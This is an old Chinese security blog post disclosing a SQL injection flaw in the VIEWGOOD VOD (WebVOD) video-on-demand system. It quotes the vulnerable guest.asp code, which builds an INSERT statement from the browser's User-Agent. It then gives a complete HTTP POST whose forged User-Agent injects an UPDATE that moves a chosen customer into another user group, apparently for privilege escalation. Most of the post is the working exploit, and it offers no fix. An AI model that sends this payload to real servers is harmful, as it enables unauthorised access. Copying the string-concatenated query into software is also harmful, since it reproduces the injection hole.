---
title: 远古视频点播系统注入漏洞
description: 作者：toby57VIEWGOODVOD视频点播系统(WebVOD)注入漏洞漏洞产生于文件/webmedia/oemui/user/guest.asp，访问这个页面需要注册相关代码：......
date: 2009-03-12 09:35:06
category: 漏洞信息
tags: ['远古', '注入', '漏洞信息']
post_id: 811
alias: VIEWGOOD-VOD-SQL-injection
ViewNums: 3524
---

作者：[toby57](http://bbs.wolvez.org/post/148/)

[VIEWGOOD VOD视频点播系统 (WebVOD)注入漏洞](/blog/viewgood-vod-sql-injection)
漏洞产生于文件/webmedia/oemui/user/guest.asp，访问这个页面需要注册

相关代码：

    szAgent = Request.ServerVariables("HTTP_USER_AGENT")
    aTmpInfo = Split(szAgent, " (", -1, 1)
    aAgentInfo = Split(aTmpInfo(1), "; ", -1, 1)

    szBrowser = aAgentInfo(1)
    if Right(aAgentInfo(2), 1) = ")" or Right(aAgentInfo(2), 1) = ";" then
        szOS = Left(aAgentInfo(2), Len(aAgentInfo(2)) - 1)
    else
        szOS = aAgentInfo(2)
    end if
    szClientIP = Request.ServerVariables("REMOTE_ADDR")

    szSQL = "INSERT INTO GuestBook(CusTomer_ID,cont,ipaddr,ostype,browser,crdt) VALUES(" & iUserID & ",'" & szMemo & "','" & szClientIP & "','" & szOS & "','" & szBrowser & "','" & now &"')"
    con.Execute szSQLHTTP_USER_AGENT我们可以自己构造

POST /webmedia/oemui/user/guest.asp HTTP/1.1
Accept: image/gif, image/x-xbitmap, image/jpeg,
Referer: [url]http://you.are.fucked.cn/webmedia/oemui/user/guest.asp[/url]
Accept-Language: zh-cn
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0','');update Customer_Group set Group_ID=1 where Customer_ID=9--; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Host: you.are.fucked.cn
Content-Length: 75
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: ASPSESSIONIDCSACDTQQ=CGGFJOGANCPNAIAIABABHMHA;

memo=aaaa&submit=%B7%A2%CB%CD%D3%C3%BB%A7%C1%F4%D1%D4%D0%C5%CF%A2+%3E%3E%3E

